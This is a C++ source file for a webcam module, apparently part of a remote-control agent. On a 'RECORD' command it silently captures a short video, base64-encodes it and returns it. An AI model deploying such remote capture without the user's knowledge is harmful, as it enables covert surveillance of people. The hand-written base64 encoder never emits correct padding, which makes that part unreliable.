#include "WebcamManager.hpp"
#include <windows.h>
#include <mfapi.h>
#include <mfidl.h>
#include <mfreadwrite.h>
#include <shlwapi.h>
#include <fstream>
#include <thread>
#include<iostream>
#include <filesystem> 

// Link các thư viện cần thiết bằng pragma (hoặc cấu hình trong CMake)
#pragma comment(lib, "mf.lib")
#pragma comment(lib, "mfplat.lib")
#pragma comment(lib, "mfreadwrite.lib")
#pragma comment(lib, "mfuuid.lib")
#pragma comment(lib, "shlwapi.lib")

#define SAFE_RELEASE(x) if (x) { (x)->Release(); (x) = nullptr; }

// ==================== HELPER BASE64 ====================
static const char* B64_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

std::string WebcamManager::base64_encode(const std::vector<uint8_t>& data) {
    // (Sử dụng lại logic encode giống ScreenManager để nhất quán)
    std::string ret;
    size_t len = data.size();
    size_t i = 0;
    while (i < len) {
        uint32_t a = (i < len) ? data[i++] : 0;
        uint32_t b = (i < len) ? data[i++] : 0;
        uint32_t c = (i < len) ? data[i++] : 0;
        uint32_t triple = (a << 16) | (b << 8) | c;
        ret.push_back(B64_CHARS[(triple >> 18) & 0x3F]);
        ret.push_back(B64_CHARS[(triple >> 12) & 0x3F]);
        ret.push_back((i > len + 1) ? '=' : B64_CHARS[(triple >> 6) & 0x3F]);
        ret.push_back((i > len) ? '=' : B64_CHARS[triple & 0x3F]);
    }
    return ret;
}

std::string WebcamManager::read_file_as_base64(const std::wstring& filepath) {
    // Mở file ở chế độ binary và đặt con trỏ ở cuối (ate) để lấy kích thước
    std::ifstream file(filepath, std::ios::binary | std::ios::ate);
    
    if (!file.is_open()) {
        std::cout << "[ERROR] read_file: Cannot open file to read!" << std::endl;
        return "";
    }
    
    std::streamsize size = file.tellg();
    
    if (size <= 0) {
        std::cout << "[ERROR] read_file: File is empty (0 bytes)." << std::endl;
        return "";
    }

    // Quay về đầu file
    file.seekg(0, std::ios::beg);
    
    std::vector<uint8_t> buffer(size);
    if (file.read(reinterpret_cast<char*>(buffer.data()), size)) {
        std::cout << "[INFO] Read " << size << " bytes from video file." << std::endl; // LOG KÍCH THƯỚC
        return base64_encode(buffer);
    }
    
    return "";
}

// ==================== MEDIA FOUNDATION LOGIC ====================

bool WebcamManager::record_video_file(const std::wstring& filepath, int duration_sec) {
    HRESULT hr = S_OK;
    IMFAttributes* pAttributes = nullptr;
    IMFActivate** ppDevices = nullptr;
    UINT32 count = 0;
    IMFMediaSource* pSource = nullptr;
    IMFSourceReader* pReader = nullptr;
    IMFSinkWriter* pWriter = nullptr;
    IMFMediaType* pOutType = nullptr;
    IMFMediaType* pInType = nullptr;
    DWORD writerStreamIndex = 0;

    std::cout << "[WEBCAM] Initializing (Software Mode)..." << std::endl;

    // 1. Khởi tạo MF
    hr = MFStartup(MF_VERSION);
    if (FAILED(hr)) return false;

    // 2. Tìm Camera
    MFCreateAttributes(&pAttributes, 1);
    pAttributes->SetGUID(MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE, MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);
    MFEnumDeviceSources(pAttributes, &ppDevices, &count);
    
    if (count == 0) {
        std::cout << "[WEBCAM] No camera found." << std::endl;
        SAFE_RELEASE(pAttributes);
        MFShutdown();
        return false;
    }

    ppDevices[0]->ActivateObject(IID_PPV_ARGS(&pSource));

    // 3. Tạo Reader (QUAN TRỌNG: Tắt Hardware Acceleration để tránh lỗi c00d36b2)
    IMFAttributes* pReaderAttributes = nullptr;
    MFCreateAttributes(&pReaderAttributes, 1);
    // [FIX] Chuyển sang FALSE (Dùng Software xử lý cho ổn định)
    pReaderAttributes->SetUINT32(MF_READWRITE_ENABLE_HARDWARE_TRANSFORMS, FALSE); 
    
    hr = MFCreateSourceReaderFromMediaSource(pSource, pReaderAttributes, &pReader);
    SAFE_RELEASE(pReaderAttributes);
    if (FAILED(hr)) return false;

    // 4. Ép Reader xuất ra RGB32 (Định dạng tương thích nhất)
    IMFMediaType* pPartialType = nullptr;
    MFCreateMediaType(&pPartialType);
    pPartialType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
    pPartialType->SetGUID(MF_MT_SUBTYPE, MFVideoFormat_RGB32); // [FIX] Dùng RGB32
    
    hr = pReader->SetCurrentMediaType(MF_SOURCE_READER_FIRST_VIDEO_STREAM, nullptr, pPartialType);
    SAFE_RELEASE(pPartialType);
    
    if (FAILED(hr)) {
        std::cout << "[WEBCAM] RGB32 not supported, trying NV12..." << std::endl;
        // Fallback về NV12 nếu RGB32 lỗi
        IMFMediaType* pNv12 = nullptr;
        MFCreateMediaType(&pNv12);
        pNv12->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
        pNv12->SetGUID(MF_MT_SUBTYPE, MFVideoFormat_NV12);
        pReader->SetCurrentMediaType(MF_SOURCE_READER_FIRST_VIDEO_STREAM, nullptr, pNv12);
        SAFE_RELEASE(pNv12);
    }

    // 5. Lấy thông số thực tế từ Reader
    IMFMediaType* pNativeType = nullptr;
    pReader->GetCurrentMediaType(MF_SOURCE_READER_FIRST_VIDEO_STREAM, &pNativeType);
    
    UINT32 width = 640, height = 480;
    UINT32 fpsNum = 30, fpsDen = 1;
    MFGetAttributeSize(pNativeType, MF_MT_FRAME_SIZE, &width, &height);
    MFGetAttributeRatio(pNativeType, MF_MT_FRAME_RATE, &fpsNum, &fpsDen);
    
    std::cout << "[WEBCAM] Res: " << width << "x" << height << " FPS: " << fpsNum << "/" << fpsDen << std::endl;

    // 6. Tạo Sink Writer (Output File)
    MFCreateSinkWriterFromURL(filepath.c_str(), nullptr, nullptr, &pWriter);

    // 7. Cấu hình Output H.264
    MFCreateMediaType(&pOutType);
    pOutType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
    pOutType->SetGUID(MF_MT_SUBTYPE, MFVideoFormat_H264);
    pOutType->SetUINT32(MF_MT_AVG_BITRATE, 2000000); // 2 Mbps cho nét
    pOutType->SetUINT32(MF_MT_INTERLACE_MODE, MFVideoInterlace_Progressive);
    MFSetAttributeSize(pOutType, MF_MT_FRAME_SIZE, width, height);
    MFSetAttributeRatio(pOutType, MF_MT_FRAME_RATE, fpsNum, fpsDen);
    MFSetAttributeRatio(pOutType, MF_MT_PIXEL_ASPECT_RATIO, 1, 1);

    hr = pWriter->AddStream(pOutType, &writerStreamIndex);
    SAFE_RELEASE(pOutType);

    // 8. Cấu hình Input cho Writer (Khớp với Reader)
    // Sink Writer sẽ tự động chèn Converter (RGB32 -> H264)
    hr = pWriter->SetInputMediaType(writerStreamIndex, pNativeType, nullptr);
    if (FAILED(hr)) {
        std::cout << "[WEBCAM] SetInputMediaType Failed: " << std::hex << hr << std::endl;
        return false;
    }
    SAFE_RELEASE(pNativeType); // Xong việc với NativeType

    // 9. Bắt đầu ghi
    if (SUCCEEDED(hr)) {
        hr = pWriter->BeginWriting();
    }

    if (SUCCEEDED(hr)) {
        ULONGLONG startTick = GetTickCount64();
        LONGLONG baseTime = -1;

        while (GetTickCount64() - startTick < (duration_sec * 1000)) {
            DWORD streamIndex, flags;
            LONGLONG timestamp;
            IMFSample* pSample = nullptr;

            // Đọc frame
            hr = pReader->ReadSample(MF_SOURCE_READER_FIRST_VIDEO_STREAM, 0, &streamIndex, &flags, &timestamp, &pSample);
            
            if (FAILED(hr)) break;

            if (pSample) {
                if (baseTime == -1) baseTime = timestamp;
                LONGLONG rebased = timestamp - baseTime;
                
                // Chỉ ghi nếu timestamp hợp lệ (không âm)
                if (rebased >= 0) {
                    pSample->SetSampleTime(rebased);
                    pSample->SetSampleDuration(10000000 / fpsNum); // Đặt duration cho frame
                    
                    hr = pWriter->WriteSample(writerStreamIndex, pSample);
                    if (FAILED(hr)) {
                        std::cout << "[WEBCAM] Write Error: " << std::hex << hr << std::endl;
                        pSample->Release();
                        break; 
                    }
                }
                pSample->Release();
            }
            // Sleep(1); // Có thể bỏ sleep để mượt hơn
        }
    }

    if (pWriter) {
        hr = pWriter->Finalize();
        if (FAILED(hr)) std::cout << "[WEBCAM] Finalize Error: " << std::hex << hr << std::endl;
    }

    // Cleanup
    SAFE_RELEASE(pReader);
    SAFE_RELEASE(pWriter);
    SAFE_RELEASE(pSource);
    SAFE_RELEASE(pAttributes);
    for(UINT32 i = 0; i < count; i++) SAFE_RELEASE(ppDevices[i]);
    CoTaskMemFree(ppDevices);
    
    MFShutdown();
    
    if (FAILED(hr)) return false;
    
    std::cout << "[WEBCAM] Success." << std::endl;
    return true;
}
// ==================== HANDLE COMMAND ====================

// Thêm include ở đầu file nếu chưa c

json WebcamManager::handle_command(const json& request) {
    std::string cmd = request.value("command", "");
    
    if (cmd == "RECORD") {
        // Đảm bảo COM chạy được trên thread này
        CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);

        // [FIX QUAN TRỌNG] Lấy đường dẫn Temp chuẩn của User để tránh lỗi quyền hạn
        wchar_t tempPathArr[MAX_PATH];
        GetTempPathW(MAX_PATH, tempPathArr); // API lấy đường dẫn %TEMP%
        std::wstring tempFile = std::wstring(tempPathArr) + L"temp_cam.mp4";
        
        // Debug log đường dẫn để kiểm tra
        std::wcout << L"[WEBCAM] Temp file path: " << tempFile << std::endl;

        int duration = request.value("duration", 5); 
        if (duration > 10) duration = 10; 

        bool res = record_video_file(tempFile, duration);

        json response;
        response["module"] = module_name_;
        response["command"] = "RECORD_RESULT";
        
        if (res) {
            // Nghỉ 500ms để file system xả dữ liệu xuống đĩa
            std::this_thread::sleep_for(std::chrono::milliseconds(500));

            std::string b64Data = read_file_as_base64(tempFile);

            if (b64Data.empty()) {
                response["status"] = "error";
                // Thêm thông tin đường dẫn vào lỗi để dễ debug
                response["message"] = "Recorded success but Read file failed (0 bytes). Path issue?";
                std::cout << "[ERROR] Video recorded but read failed." << std::endl;
            } else {
                response["status"] = "success";
                response["data"] = b64Data;
                response["format"] = "mp4_base64";
            }
            
            // Xóa file tạm
            _wremove(tempFile.c_str()); 
        } else {
            response["status"] = "error";
            response["message"] = "Failed to record webcam (Camera busy or not found)";
        }

        CoUninitialize();
        return response;
    }

    return {
        {"status", "error"},
        {"message", "Unknown WEBCAM command"}
    };
}